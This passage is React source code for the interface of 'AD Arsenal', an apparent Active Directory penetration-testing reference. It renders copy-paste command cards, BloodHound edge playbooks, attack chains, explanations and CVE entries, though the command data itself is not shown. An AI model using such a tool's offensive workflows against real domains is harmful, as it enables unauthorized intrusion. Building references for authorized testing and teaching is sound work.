      <div className="px-4 pt-3.5 pb-3">
        <div className="flex items-center gap-2 mb-1">
          <span
            className="text-[10px] uppercase tracking-wider font-semibold px-1.5 py-0.5 rounded"
            style={{ color: cat.color, background: cat.color + "15", fontFamily: FONT_MONO }}
          >
            {cat.label}
          </span>
          <span className="text-[11px]" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
            on {edge.target}
          </span>
        </div>
        <h3 className="text-[15px] leading-snug" style={{ fontFamily: FONT_MONO, fontWeight: 600, color: TEXT_PRIMARY }}>
          {edge.name}
        </h3>
        <p className="text-[13px] mt-1 leading-relaxed" style={{ color: TEXT_BODY }}>{edge.grants}</p>
      </div>

      <div className="px-4 space-y-2 pb-1">
        {edge.steps.map((step, i) => {
          const isComment = step.startsWith("#");
          const shell = "bash";
          const variants = isComment
            ? [{ label: null, command: step }]
            : getCommandVariants(step).map((v) => ({ ...v, command: applyAuthPreference(v.command, values) }));
          return (
            <div key={i} className="flex items-start gap-2">
              <span className="text-[11px] mt-2.5 shrink-0" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
                {i + 1}.
              </span>
              <div className="flex-1 min-w-0 space-y-1.5">
                {variants.map((v, vi) => (
                  <div key={vi} className="flex items-start gap-2">
                    <div className="flex-1 min-w-0">
                      {v.label && (
                        <p className="text-[9px] uppercase tracking-wide mb-0.5" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
                          {v.label}
                        </p>
                      )}
                      <div
                        className="rounded-md px-3 py-2 text-[12px] overflow-x-auto whitespace-pre"
                        style={{
                          background: VOID,
                          color: isComment ? STRUCTURAL : TEXT_COMMAND,
                          border: `1px solid ${BORDER_1}`,
                          fontStyle: isComment ? "italic" : "normal",
                          fontFamily: FONT_MONO,
                        }}
                      >
                        {isComment ? v.command : <CommandLine command={v.command} values={values} shell={shell} />}
                      </div>
                    </div>
                    {!isComment && (
                      <div className="mt-0.5 shrink-0">
                        <CopyButton text={substitute(v.command, values, shell)} />
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>
          );
        })}
      </div>

      <div className="px-4 py-3">
        <p className="text-[12px] leading-relaxed" style={{ color: cat.color }}>
          <span className="font-semibold">Impact — </span>
          {edge.impact}
        </p>
      </div>
    </div>
  );
}

// One row of an attack chain tree. Connectors (├──/└──/│) are computed from
// tree position, same algorithm the `tree` command uses, rather than
// hand-authored per node — CHAINS only needs to supply nesting via `children`.
// A node's `command` renders exactly like an EdgeCard step: run through
// getCommandVariants (impacket .py vs impacket-* binary, certipy vs
// certipy-ad, bloodyAD vs bloodyad — same dual-invocation logic Commands and
// Edge Lookup already use) and applyAuthPreference, each variant shown via
// CommandLine with its own CopyButton.
function ChainNode({ node, prefix, isLast, depth, color, values }) {
  const connector = depth === 0 ? "" : isLast ? "└── " : "├── ";
  const childPrefix = depth === 0 ? "" : prefix + (isLast ? "    " : "│   ");
  const shell = shellOf({ tool: node.label, command: node.command || "" });
  const variants = node.command
    ? getCommandVariants(node.command).map((v) => ({ ...v, command: applyAuthPreference(v.command, values) }))
    : [];
  return (
    <>
      <div className="flex flex-wrap items-baseline gap-x-2 text-[13px] leading-[1.85]" style={{ fontFamily: FONT_MONO }}>
        <span style={{ color: STRUCTURAL, whiteSpace: "pre" }} aria-hidden="true">
          {prefix}
          {connector}
        </span>
        <span style={{ color: depth === 0 ? TEXT_PRIMARY : color, fontWeight: depth === 0 ? 700 : 600 }}>{node.label}</span>
        {node.note && (
          <span className="text-[11px]" style={{ color: STRUCTURAL }}>
            {node.note}
          </span>
        )}
      </div>
      {node.command && (
        <div className="space-y-1.5 mb-1" style={{ paddingLeft: `${(prefix + connector).length}ch` }}>
          {variants.map((v, vi) => (
            <div key={vi} className="flex items-start gap-2">
              <div className="flex-1 min-w-0">
                {v.label && (
                  <p className="text-[9px] uppercase tracking-wide mb-0.5" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
                    {v.label}
                  </p>
                )}
                <div
                  className="rounded-md px-2.5 py-1.5 text-[11px] overflow-x-auto whitespace-pre"
                  style={{ background: VOID, color: TEXT_COMMAND, border: `1px solid ${BORDER_1}`, fontFamily: FONT_MONO }}
                >
                  <CommandLine command={v.command} values={values} shell={shell} />
                </div>
              </div>
              <div className="mt-0.5 shrink-0">
                <CopyButton text={substitute(v.command, values, shell)} />
              </div>
            </div>
          ))}
        </div>
      )}
      {node.children?.map((child, i) => (
        <ChainNode
          key={i}
          node={child}
          prefix={childPrefix}
          isLast={i === node.children.length - 1}
          depth={depth + 1}
          color={color}
          values={values}
        />
      ))}
    </>
  );
}

function ChainCard({ chain, values }) {
  const cat = edgeCategoryOf(chain.category);
  const [hover, setHover] = useState(false);
  return (
    <div
      onMouseEnter={() => setHover(true)}
      onMouseLeave={() => setHover(false)}
      className="rounded-lg border overflow-hidden transition-colors"
      style={{ borderColor: hover ? cat.color + "40" : BORDER_2, background: SURFACE }}
    >
      <div className="px-4 pt-3.5 pb-3">
        <span
          className="text-[10px] uppercase tracking-wider font-semibold px-1.5 py-0.5 rounded"
          style={{ color: cat.color, background: cat.color + "15", fontFamily: FONT_MONO }}
        >
          {cat.label}
        </span>
        <h3 className="text-[15px] leading-snug mt-1.5" style={{ fontFamily: FONT_MONO, fontWeight: 600, color: TEXT_PRIMARY }}>
          {chain.title}
        </h3>
        <p className="text-[12px] mt-1 leading-relaxed" style={{ color: TEXT_BODY }}>
          {chain.summary}
        </p>
      </div>
      <div className="px-4 pb-4 pt-1 rounded-md mx-4 mb-4" style={{ background: VOID, border: `1px solid ${BORDER_1}` }}>
        <div className="pt-2.5">
          <ChainNode node={chain.root} prefix="" isLast={true} depth={0} color={cat.color} values={values} />
        </div>
      </div>
    </div>
  );
}

// ============================================================
// ATTACK CHAINS EXPLORER — multi-edge exploitation paths, the
// connective tissue EdgeExplorer's single-hop lookups don't show.
// ============================================================
function ChainExplorer({ values }) {
  const [activeCat, setActiveCat] = useState("all");
  const filtered = useMemo(() => CHAINS.filter((c) => activeCat === "all" || c.category === activeCat), [activeCat]);
  const categoriesInUse = EDGE_CATEGORIES.filter((c) => CHAINS.some((ch) => ch.category === c.id));

  return (
    <div>
      <p className="text-xs mb-4 leading-relaxed max-w-2xl" style={{ color: STRUCTURAL }}>
        A single edge is one hop. A real BloodHound path is usually three to six of them, linked — these are the
        connective chains: prerequisite → primitive → resulting identity → next hop.
      </p>
      <div className="flex flex-wrap gap-2 mb-6">
        <button
          onClick={() => setActiveCat("all")}
          className="text-xs font-medium px-3 py-1.5 rounded-full transition-colors"
          style={{
            background: activeCat === "all" ? BORDER_3 : "transparent",
            color: activeCat === "all" ? TEXT_PRIMARY : STRUCTURAL,
            border: `1px solid ${BORDER_3}`,
          }}
        >
          All ({CHAINS.length})
        </button>
        {categoriesInUse.map((c) => {
          const count = CHAINS.filter((ch) => ch.category === c.id).length;
          const active = activeCat === c.id;
          return (
            <button
              key={c.id}
              onClick={() => setActiveCat(c.id)}
              className="text-xs font-medium px-3 py-1.5 rounded-full transition-colors"
              style={{
                background: active ? c.color + "15" : "transparent",
                color: active ? c.color : STRUCTURAL,
                border: `1px solid ${active ? c.color + "55" : BORDER_3}`,
              }}
            >
              {c.label} ({count})
            </button>
          );
        })}
      </div>
      {filtered.length === 0 ? (
        <div className="text-center py-16 text-sm font-mono" style={{ color: STRUCTURAL }}>No chains match that filter.</div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {filtered.map((c) => (
            <ChainCard key={c.id} chain={c} values={values} />
          ))}
        </div>
      )}
    </div>
  );
}

function EdgeExplorer({ values, mode = "edges" }) {
  const [activeCat, setActiveCat] = useState("all");

  const filtered = useMemo(() => {
    return EDGES.filter((e) => activeCat === "all" || e.category === activeCat);
  }, [activeCat]);

  return (
    <div>
      {mode === "chains" ? (
        <ChainExplorer values={values} />
      ) : (
        <>
          <p className="text-xs mb-4 leading-relaxed max-w-2xl" style={{ color: STRUCTURAL }}>
            Type the edge name BloodHound showed you into the search bar above — e.g.{" "}
            <span className="font-mono" style={{ color: STRUCTURAL }}>GenericWrite</span> or{" "}
            <span className="font-mono" style={{ color: STRUCTURAL }}>ADCS ESC1</span> — and get the connected command chain for exploiting it,
            using the variables you set above. Use the filters below to just browse a category instead.
          </p>
          <div className="flex flex-wrap gap-2 mb-6">
            <button
              onClick={() => setActiveCat("all")}
              className="text-xs font-medium px-3 py-1.5 rounded-full transition-colors"
              style={{
                background: activeCat === "all" ? BORDER_3 : "transparent",
                color: activeCat === "all" ? TEXT_PRIMARY : STRUCTURAL,
                border: `1px solid ${BORDER_3}`,
              }}
            >
              All ({EDGES.length})
            </button>
            {EDGE_CATEGORIES.map((c) => {
              const count = EDGES.filter((e) => e.category === c.id).length;
              const active = activeCat === c.id;
              return (
                <button
                  key={c.id}
                  onClick={() => setActiveCat(c.id)}
                  className="text-xs font-medium px-3 py-1.5 rounded-full transition-colors"
                  style={{
                    background: active ? c.color + "15" : "transparent",
                    color: active ? c.color : STRUCTURAL,
                    border: `1px solid ${active ? c.color + "55" : BORDER_3}`,
                  }}
                >
                  {c.label} ({count})
                </button>
              );
            })}
          </div>
          {filtered.length === 0 ? (
            <div className="text-center py-16 text-sm font-mono" style={{ color: STRUCTURAL }}>No edges match that query.</div>
          ) : (
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {filtered.map((e) => (
                <EdgeCard key={e.id} edge={e} values={values} />
              ))}
            </div>
          )}
        </>
      )}
    </div>
  );
}

// ============================================================
// LEARNBOOK — why/how/effect explanations, separate from the
// copy-paste command reference and the edge playbooks above.
// ============================================================
function LearnCard({ item }) {
  const [open, setOpen] = useState(false);
  const [hover, setHover] = useState(false);
  return (
    <div
      onMouseEnter={() => setHover(true)}
      onMouseLeave={() => setHover(false)}
      className="rounded-lg border overflow-hidden transition-colors"
      style={{ borderColor: hover || open ? SIGNATURE + "40" : BORDER_2, background: SURFACE }}
    >
      <button onClick={() => setOpen(!open)} className="w-full text-left px-4 py-3.5 flex items-start justify-between gap-3">
        <div>
          <h3 className="text-[15px] leading-snug" style={{ fontFamily: FONT_SANS, fontWeight: 600, color: TEXT_PRIMARY }}>
            {item.title}
          </h3>
          <p className="text-[12px] mt-1 leading-relaxed" style={{ color: STRUCTURAL }}>
            {item.why}
          </p>
        </div>
        <ChevronRight
          size={16}
          className="shrink-0 mt-1 transition-transform"
          style={{ transform: open ? "rotate(90deg)" : "rotate(0deg)", color: open ? SIGNATURE : STRUCTURAL }}
        />
      </button>
      {open && (
        <div className="px-4 pb-4 space-y-3 border-t" style={{ borderColor: BORDER_1 }}>
          <div className="pt-3">
            <p className="text-[11px] uppercase tracking-wide font-semibold mb-1" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
              How / why it works
            </p>
            <p className="text-[13px] leading-relaxed" style={{ color: TEXT_BODY }}>{item.body}</p>
          </div>
          <div>
            <p className="text-[11px] uppercase tracking-wide font-semibold mb-1" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
              Effect
            </p>
            <p className="text-[13px] leading-relaxed" style={{ color: TEXT_BODY }}>{item.effect}</p>
          </div>
          {item.detection && (
            <div>
              <p className="text-[11px] uppercase tracking-wide font-semibold mb-1" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
                Detection
              </p>
              <p className="text-[13px] leading-relaxed" style={{ color: TEXT_BODY }}>{item.detection}</p>
            </div>
          )}
          {item.remediation && (
            <div>
              <p className="text-[11px] uppercase tracking-wide font-semibold mb-1" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
                Remediation
              </p>
              <p className="text-[13px] leading-relaxed" style={{ color: TEXT_BODY }}>{item.remediation}</p>
            </div>
          )}
          {item.links && item.links.length > 0 && (
            <div>
              <p className="text-[11px] uppercase tracking-wide font-semibold mb-1" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
                Source / further reading
              </p>
              <ul className="space-y-1">
                {item.links.map((l, i) => (
                  <li key={i}>
                    <a
                      href={l.url}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-[13px] underline underline-offset-2"
                      style={{ color: SIGNATURE }}
                      onClick={(e) => e.stopPropagation()}
                    >
                      {l.label}
                    </a>
                  </li>
                ))}
              </ul>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

function Learnbook() {
  const [activeCat, setActiveCat] = useState("all");

  const filtered = useMemo(() => {
    return LEARN.filter((e) => activeCat === "all" || e.category === activeCat);
  }, [activeCat]);

  return (
    <div>
      <p className="text-xs mb-4 leading-relaxed max-w-2xl" style={{ color: STRUCTURAL }}>
        The mechanism behind each technique — what's actually happening, why it works, and what it changes — separate
        from the copy-paste commands. The AD CS section follows the full ESC1–ESC11+ tree, each with detection and
        remediation notes. Search a concept using the bar above, or browse a category below.
      </p>
      <div className="flex flex-wrap gap-2 mb-6">
        <button
          onClick={() => setActiveCat("all")}
          className="text-xs font-medium px-3 py-1.5 rounded-full transition-colors"
          style={{
            background: activeCat === "all" ? BORDER_3 : "transparent",
            color: activeCat === "all" ? TEXT_PRIMARY : STRUCTURAL,
            border: `1px solid ${BORDER_3}`,
          }}
        >
          All ({LEARN.length})
        </button>
        {LEARN_CATEGORIES.map((c) => {
          const count = LEARN.filter((e) => e.category === c.id).length;
          const active = activeCat === c.id;
          return (
            <button
              key={c.id}
              onClick={() => setActiveCat(c.id)}
              className="text-xs font-medium px-3 py-1.5 rounded-full transition-colors"
              style={{
                background: active ? BORDER_3 : "transparent",
                color: active ? TEXT_PRIMARY : STRUCTURAL,
                border: `1px solid ${BORDER_3}`,
              }}
            >
              {c.label} ({count})
            </button>
          );
        })}
      </div>
      {filtered.length === 0 ? (
        <div className="text-center py-16 text-sm font-mono" style={{ color: STRUCTURAL }}>No topics match that query.</div>
      ) : (
        <div className="space-y-3">
          {filtered.map((item) => (
            <LearnCard key={item.id} item={item} />
          ))}
        </div>
      )}
    </div>
  );
}

// ============================================================
// CVE EXPLORER — dedicated, searchable database of every CVE
// referenced throughout this reference. "See also" links reuse
// the global search feature to surface the related commands and
// Learnbook writeup live, rather than pointing at dead anchors.
// ============================================================
function CVECard({ cve, onSeeAlso }) {
  const [hover, setHover] = useState(false);
  const sevColor = CVE_SEVERITY_COLORS[cve.severity] || STRUCTURAL;
  return (
    <div
      onMouseEnter={() => setHover(true)}
      onMouseLeave={() => setHover(false)}
      className="rounded-lg border overflow-hidden transition-colors"
      style={{ borderColor: hover ? SIGNATURE + "40" : BORDER_2, background: SURFACE }}
    >
      <div className="px-4 pt-3.5 pb-3">
        <div className="flex items-center gap-2 mb-1.5 flex-wrap">
          <span
            className="text-[10px] uppercase tracking-wider font-semibold px-1.5 py-0.5 rounded"
            style={{ color: sevColor, background: sevColor + "18", fontFamily: FONT_MONO }}
          >
            {cve.severity}
          </span>
          {cve.cvss && (
            <span className="text-[10px]" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
              CVSS {cve.cvss}
            </span>
          )}
          <span className="text-[10px]" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
            {cve.disclosed}
          </span>
        </div>
        <h3 className="text-[14px] leading-snug mb-0.5" style={{ fontFamily: FONT_MONO, fontWeight: 700, color: SIGNATURE }}>
          {cve.cveId}
        </h3>
        <p className="text-[15px] leading-snug mb-2" style={{ fontFamily: FONT_MONO, fontWeight: 600, color: TEXT_PRIMARY }}>
          {cve.title}
        </p>
        <p className="text-[13px] leading-relaxed" style={{ color: TEXT_BODY }}>{cve.summary}</p>
      </div>

      {cve.relatedTools.length > 0 && (
        <div className="px-4 pb-3 flex flex-wrap gap-1.5">
          {cve.relatedTools.map((t, i) => (
            <span
              key={i}
              className="text-[10.5px] px-1.5 py-0.5 rounded"
              style={{ background: BORDER_0, color: STRUCTURAL, fontFamily: FONT_MONO }}
            >
              {t}
            </span>
          ))}
        </div>
      )}

      {cve.seeAlso && (
        <div className="px-4 pb-3.5">
          <button
            onClick={() => onSeeAlso(cve.seeAlso.query)}
            className="text-[12px] underline underline-offset-2"
            style={{ color: SIGNATURE, fontFamily: FONT_MONO }}
          >
            {cve.seeAlso.label} →
          </button>
        </div>
      )}
    </div>
  );
}

function CVEExplorer({ onSeeAlso }) {
  return (
    <div>
      <p className="text-xs mb-4 leading-relaxed max-w-2xl" style={{ color: STRUCTURAL }}>
        Every CVE referenced throughout this reference, in one place — severity, disclosure date, what actually
        breaks, and a live link into the related commands or Learnbook writeup. Search a CVE number or name using the
        bar above.
      </p>
      {CVES.length === 0 ? (
        <div className="text-center py-16 text-sm" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
          No CVEs match that query.
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {CVES.map((c) => (
            <CVECard key={c.id} cve={c} onSeeAlso={onSeeAlso} />
          ))}
        </div>
      )}
    </div>
  );
}

export default function ADArsenal() {
  const [view, setView] = useState("commands"); // "commands" | "edges" | "learnbook"
  const [edgeMode, setEdgeMode] = useState("edges"); // "edges" | "chains" — which lens the edges view uses
  const [activePhase, setActivePhase] = useState("all");
  const [activeTool, setActiveTool] = useState("all");
  const [menuOpen, setMenuOpen] = useState(false);
  const [values, setValues] = useState({});
  const [globalQuery, setGlobalQuery] = useState("");
  const [theme, setTheme] = useState("dark"); // "dark" | "light"

  const filtered = useMemo(() => {
    return ENTRIES.filter(
      (e) => (activePhase === "all" || e.phase === activePhase) && (activeTool === "all" || e.tool === activeTool)
    );
  }, [activePhase, activeTool]);

  // Searches Commands + Attack Paths + Learnbook simultaneously, regardless
  // of which tab is currently active — separate from the per-tab search
  // above, which only filters within the Commands tab.
  const globalResults = useMemo(() => {
    const q = globalQuery.trim().toLowerCase();
    if (!q) return null;
    const entries = ENTRIES.filter(
      (e) =>
        e.tool.toLowerCase().includes(q) ||
        e.title.toLowerCase().includes(q) ||
        e.description.toLowerCase().includes(q) ||
        e.command.toLowerCase().includes(q)
    );
    const edges = EDGES.filter(
      (e) =>
        e.name.toLowerCase().includes(q) ||
        e.target.toLowerCase().includes(q) ||
        e.grants.toLowerCase().includes(q)
    );
    const learn = LEARN.filter(
      (l) => l.title.toLowerCase().includes(q) || l.body.toLowerCase().includes(q) || l.why.toLowerCase().includes(q)
    );
    const cves = CVES.filter(
      (c) => c.cveId.toLowerCase().includes(q) || c.title.toLowerCase().includes(q) || c.summary.toLowerCase().includes(q)
    );
    const chains = CHAINS.filter((c) => CHAIN_SEARCH_TEXT.get(c.id).includes(q));
    return { entries, edges, learn, cves, chains };
  }, [globalQuery]);

  // Esc clears the global search from anywhere on the page.
  useEffect(() => {
    const onKeyDown = (e) => {
      if (e.key === "Escape" && globalQuery) setGlobalQuery("");
    };
    window.addEventListener("keydown", onKeyDown);
    return () => window.removeEventListener("keydown", onKeyDown);
  }, [globalQuery]);

  return (
    <div className="ad-arsenal-root min-h-screen w-full" data-theme={theme} style={{ background: VOID, fontFamily: FONT_SANS }}>
      <GlobalStyle />

      {/* Standalone menu trigger — icon-only, pinned to the viewport corner like an
          app chrome control, deliberately separate from the header's action buttons. */}
      <button
        onClick={() => setMenuOpen(true)}
        aria-label="Open menu"
        className="fixed flex items-center justify-center rounded-md transition-colors"
        style={{
          top: 20,
          left: 20,
          width: 34,
          height: 34,
          zIndex: 30,
          background: SURFACE,
          border: `1px solid ${BORDER_2}`,
          color: STRUCTURAL,
        }}
      >
        <Menu size={16} />
      </button>

      <div className="max-w-5xl mx-auto px-5 py-10">
        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center gap-3.5 mb-3">
            <div
              className="w-11 h-11 rounded-xl flex items-center justify-center shrink-0"
              style={{ background: SIGNATURE + "18", border: `1px solid ${SIGNATURE}4D` }}
            >
              <FolderTree size={22} style={{ color: SIGNATURE }} />
            </div>
            <h1 className="text-[40px] leading-none tracking-tight" style={{ fontFamily: FONT_MONO, fontWeight: 700 }}>
              <span style={{ color: SIGNATURE }}>AD</span>{" "}
              <span style={{ color: TEXT_PRIMARY }}>Arsenal</span>
            </h1>
          </div>
          <div className="h-[3px] w-11 rounded-full mb-3" style={{ background: SIGNATURE, marginLeft: "3.5rem" }} />

          <div className="flex items-center justify-between gap-2 mb-4" style={{ marginLeft: "3.5rem" }}>
            <div className="flex items-center gap-2" style={{ color: STRUCTURAL }}>
              <Terminal size={13} />
              <span className="text-[10px] tracking-[0.18em] uppercase" style={{ fontFamily: FONT_MONO }}>
                Active Directory Attack Reference
              </span>
            </div>
            <div className="flex items-center gap-2">
              <button
                onClick={() => setTheme(theme === "dark" ? "light" : "dark")}
                aria-label={theme === "dark" ? "Switch to day theme" : "Switch to night theme"}
                className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-md text-[11px] transition-colors"
                style={{ background: SURFACE, border: `1px solid ${BORDER_2}`, color: STRUCTURAL, fontFamily: FONT_MONO }}
              >
                {theme === "dark" ? <Sun size={13} /> : <Moon size={13} />}
                {theme === "dark" ? "Day" : "Night"}
              </button>
            </div>
          </div>

          <DITHero
            counts={{ entries: ENTRIES.length, edges: EDGES.length, chains: CHAINS.length, learn: LEARN.length, cves: CVES.length }}
          />
        </div>

        <MenuDrawer
          open={menuOpen}
          onClose={() => setMenuOpen(false)}
          view={view}
          setView={setView}
          activePhase={activePhase}
          setActivePhase={setActivePhase}
          edgeMode={edgeMode}
          setEdgeMode={setEdgeMode}
        />

        <div className="mb-8" style={{ borderBottom: `1px solid ${BORDER_1}` }} />

        <VariablePanel values={values} setValues={setValues} />

        {/* Global search — the only search field in the app, covers everything */}
        <div className="relative mb-6">
          <Search size={16} className="absolute left-3.5 top-1/2 -translate-y-1/2" style={{ color: SIGNATURE }} />
          <input
            type="text"
            value={globalQuery}
            onChange={(e) => setGlobalQuery(e.target.value)}
            placeholder="Search everything — commands, attack paths, learnbook, CVEs... (Esc to clear)"
            autoComplete="off"
            autoCorrect="off"
            autoCapitalize="off"
            spellCheck="false"
            className="w-full rounded-lg pl-10 pr-10 py-3 text-sm outline-none"
            style={{
              background: SURFACE,
              border: `1px solid ${globalQuery ? SIGNATURE + "55" : BORDER_2}`,
              color: TEXT_PRIMARY,
              fontFamily: FONT_MONO,
            }}
          />
          {globalQuery && (
            <button
              onClick={() => setGlobalQuery("")}
              aria-label="Clear search"
              className="absolute right-3.5 top-1/2 -translate-y-1/2 text-xs"
              style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}
            >
              ✕
            </button>
          )}
        </div>

        {globalResults ? (
          <div className="space-y-8">
            <p className="text-xs" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
              {globalResults.entries.length +
                globalResults.edges.length +
                globalResults.chains.length +
                globalResults.learn.length +
                globalResults.cves.length}{" "}
              results across Commands, Attack Paths, Attack Chains, Learnbook, and CVEs
            </p>

            {globalResults.cves.length > 0 && (
              <div>
                <h2 className="text-[13px] uppercase tracking-wide mb-3" style={{ color: SIGNATURE, fontFamily: FONT_MONO }}>
                  CVEs ({globalResults.cves.length})
                </h2>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {globalResults.cves.map((c) => (
                    <CVECard key={c.id} cve={c} onSeeAlso={(q) => setGlobalQuery(q)} />
                  ))}
                </div>
              </div>
            )}

            {globalResults.entries.length > 0 && (
              <div>
                <h2 className="text-[13px] uppercase tracking-wide mb-3" style={{ color: SIGNATURE, fontFamily: FONT_MONO }}>
                  Commands ({globalResults.entries.length})
                </h2>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {globalResults.entries.map((e) => (
                    <EntryCard key={e.id} entry={e} values={values} />
                  ))}
                </div>
              </div>
            )}

            {globalResults.edges.length > 0 && (
              <div>
                <h2 className="text-[13px] uppercase tracking-wide mb-3" style={{ color: SIGNATURE, fontFamily: FONT_MONO }}>
                  Attack Paths ({globalResults.edges.length})
                </h2>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {globalResults.edges.map((e) => (
                    <EdgeCard key={e.id} edge={e} values={values} />
                  ))}
                </div>
              </div>
            )}

            {globalResults.chains.length > 0 && (
              <div>
                <h2 className="text-[13px] uppercase tracking-wide mb-3" style={{ color: SIGNATURE, fontFamily: FONT_MONO }}>
                  Attack Chains ({globalResults.chains.length})
                </h2>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {globalResults.chains.map((c) => (
                    <ChainCard key={c.id} chain={c} values={values} />
                  ))}
                </div>
              </div>
            )}

            {globalResults.learn.length > 0 && (
              <div>
                <h2 className="text-[13px] uppercase tracking-wide mb-3" style={{ color: SIGNATURE, fontFamily: FONT_MONO }}>
                  Learnbook ({globalResults.learn.length})
                </h2>
                <div className="space-y-3">
                  {globalResults.learn.map((item) => (
                    <LearnCard key={item.id} item={item} />
                  ))}
                </div>
              </div>
            )}

            {globalResults.entries.length +
              globalResults.edges.length +
              globalResults.chains.length +
              globalResults.learn.length +
              globalResults.cves.length ===
              0 && (
              <div className="text-center py-16 text-sm" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
                Nothing matches that search anywhere in the reference.
              </div>
            )}
          </div>
        ) : (
          <>
            {view === "commands" && (
              <div className="flex gap-5 items-start">
                <ToolsFacet activeTool={activeTool} setActiveTool={setActiveTool} />

                <div className="flex-1 min-w-0">
                  {/* Active filters — phase/tool now live in the Menu drawer and the
                      Tools facet, so this chip row is what tells you what's applied. */}
                  <div className="flex flex-wrap items-center gap-2 mb-6">
                    <span className="text-xs" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
                      {filtered.length} / {ENTRIES.length}
                    </span>
                    {activePhase !== "all" && (
                      <button
                        onClick={() => setActivePhase("all")}
                        className="flex items-center gap-1 text-xs font-medium px-2.5 py-1 rounded-full transition-colors"
                        style={{
                          background: phaseOf(activePhase).bg,
                          color: phaseOf(activePhase).color,
                          border: `1px solid ${phaseOf(activePhase).color}55`,
                        }}
                      >
                        {phaseOf(activePhase).label} <X size={11} />
                      </button>
                    )}
                    {activeTool !== "all" && (
                      <button
                        onClick={() => setActiveTool("all")}
                        className="flex items-center gap-1 text-xs font-medium px-2.5 py-1 rounded-full transition-colors"
                        style={{ background: SIGNATURE + "14", color: SIGNATURE, border: `1px solid ${SIGNATURE}55` }}
                      >
                        {activeTool} <X size={11} />
                      </button>
                    )}
                  </div>

                  {/* Results */}
                  {filtered.length === 0 ? (
                    <div className="text-center py-16 text-sm" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
                      No entries match that query.
                    </div>
                  ) : (
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      {filtered.map((e) => (
                        <EntryCard key={e.id} entry={e} values={values} />
                      ))}
                    </div>
                  )}
                </div>
              </div>
            )}

            {view === "edges" && <EdgeExplorer values={values} mode={edgeMode} />}

            {view === "learnbook" && <Learnbook />}

            {view === "cves" && <CVEExplorer onSeeAlso={(q) => setGlobalQuery(q)} />}
          </>
        )}

        <div
          className="mt-12 pt-6 text-center text-[11px]"
          style={{ borderTop: `1px solid ${BORDER_1}`, color: TEXT_FAINT, fontFamily: FONT_MONO }}
        >
          For authorized security testing and education only.
        </div>
      </div>
    </div>
  );
}